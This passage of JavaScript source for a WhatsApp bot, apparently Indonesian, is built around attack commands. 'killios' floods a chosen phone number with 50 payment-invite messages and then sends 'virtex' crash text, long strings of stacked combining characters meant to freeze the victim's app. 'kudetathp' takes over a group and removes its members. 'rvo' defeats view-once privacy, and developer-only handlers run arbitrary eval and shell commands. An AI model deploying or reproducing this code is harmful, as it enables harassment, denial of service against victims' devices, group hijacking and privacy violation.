𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







Dasar 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄`
}, {
quoted: hobug
})
zynxzo.sendMessage(m.chat, {image: {url: `${zynxzoAttack}`}, caption: `𝘚𝘶𝘤𝘤𝘦𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘊𝘦𝘬 𝘛𝘢𝘳𝘨𝘦𝘵 𝘚𝘶𝘥𝘢𝘩 𝗖𝟭`},{quoted: m })
await sleep(2000)
//Sending Audio
    zynxzo.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: zets })
taskdone(finishmoji)
}
break
//=================================================//
case 'zynxzoiphone': case 'killios': {
if (!isPremium) return
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
inireact(randomemoji)
if (!q) return zreply(`<!> Perintah Tidak Valid!\n\n[ Example: .${command} 628xxx ]`); 
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return zreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628xxx`)
  let target = bijipler + '@s.whatsapp.net'   
  zreply(mess.bugwait) 
        for (let j = 0; j < 50; j++) {
zynxzo.relayMessage(target,{
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{ participant: { jid: target }});
await sleep(2500)
}
//Pengalihan Isu
    await zynxzo.sendMessage(target, {
    contextInfo: {
    mentionedJid: ['00000@s.whatsapp.net'],
    externalAdReply: {
    showAdAttribution: false,
    renderLargerThumbnail: false,
    jpegThumbnail: fakejpg,
    title: xcrash.xv,
    body: `⁗ ⋄ 𝐘𝐎𝐔 𝐖𝐈𝐋𝐋 𝐃𝐈𝐄!! `,
    previewType: "VIDEO",
    sourceUrl: `《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ VIRTEX██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







Dasar 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄`,
    mediaType: 1,
    mediaUrl: `${global.url}`
    }
   }, //Text For Bug
  text: `《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ VIRTEX██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







Dasar 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄`
}, {
quoted: hobug
})
zynxzo.sendMessage(m.chat, {image: {url: `${zynxzoAttack}`}, caption: ` 𝘚𝘶𝘤𝘤𝘦𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘊𝘦𝘬 𝘛𝘢𝘳𝘨𝘦𝘵 𝘚𝘶𝘥𝘢𝘩 𝗖𝟭`},{quoted: m })
await sleep(2000)
//Sending Audio
    zynxzo.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: zets })
taskdone(finishmoji)
}
break

case 'readvo': 
case 'rvo': {
if (!q) return zreply('Balas Gambar/Video Bersifat 1x Lihat')
if (m.quoted.mtype !== 'viewOnceMessage') return z.reply('Ini Bukan Pesan View-Once.')
let msg = m.quoted.message
let type = Object.keys(msg)[0]
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
zynxzo.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
if (/video/.test(type)) {
return zynxzo.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return zynxzo.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break
//=================================================//
case 'ping': {
if (!isPremium) return
inireact(randomemoji)
zreply(`< ! > *Aktif Selama* : ${runtime(process.uptime())} `)
taskdone(finishmoji)
}
break
//=================================================//
case 'kudetathp': {
if (!isPremium) return zreply(mess.premium)
if (!isGroup) return zreply(`Khusus Dalam Group Bego`)
if (!isAdmins && !isDeveloper) return zynxzo.sendMessage('Khusus Admin')
if (!isBotAdmins) return zynxzo.sendMessage(`Bot Bukan Admin Bego`)
await zynxzo.groupUpdateSubject(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙕𝙔𝙉𝙓𝙕𝙊𝙊')
await zynxzo.groupUpdateDescription(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙕𝙔𝙉𝙓𝙕𝙊𝙊')
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupMetadata.owner && x !== kontributor + "@s.whatsapp.net") {
await zynxzo.groupParticipantsUpdate(m.chat, [x], "remove")
}}}
break
//=================================================//
default:
}
}
if (budy.startsWith("=>")) {
if (!isDeveloper) return zreply(mess.owner)
try {
const result = await eval(`(async () => { return ${budy.slice(3)} })()`)
zreply(util.format(result))
} catch (e) {
zreply(String(e))
}
}
if (budy.startsWith(">")) {
if (!isDeveloper) return zreply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
await zreply(evaled)
} catch (err) {
await zreply(String(err))
}
}
if (budy.startsWith("$")) {
if (!isDeveloper) return zreply(mess.owner)
exec(budy.slice(2),
(err, stdout) => {
if (err) return zreply(err.toString())
if (stdout) return zreply(stdout.toString())
})
}
} catch (err) {
const handleError = async () => {
zynxzo.sendMessage(global.ownMain + "@s.whatsapp.net", {
text: require("util").format(err)
}, {
quoted: m
})
new Promise(resolve => setTimeout(resolve, 2000))
/*zreply(`!Eror, error details will be sent to bot contributors ✓

${util.format(err)}`)*/
console.log(util.format(err))
}
handleError()
}
}
let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(color(`Update ${__filename}`, "green"))
delete require.cache[file];
require(file);
});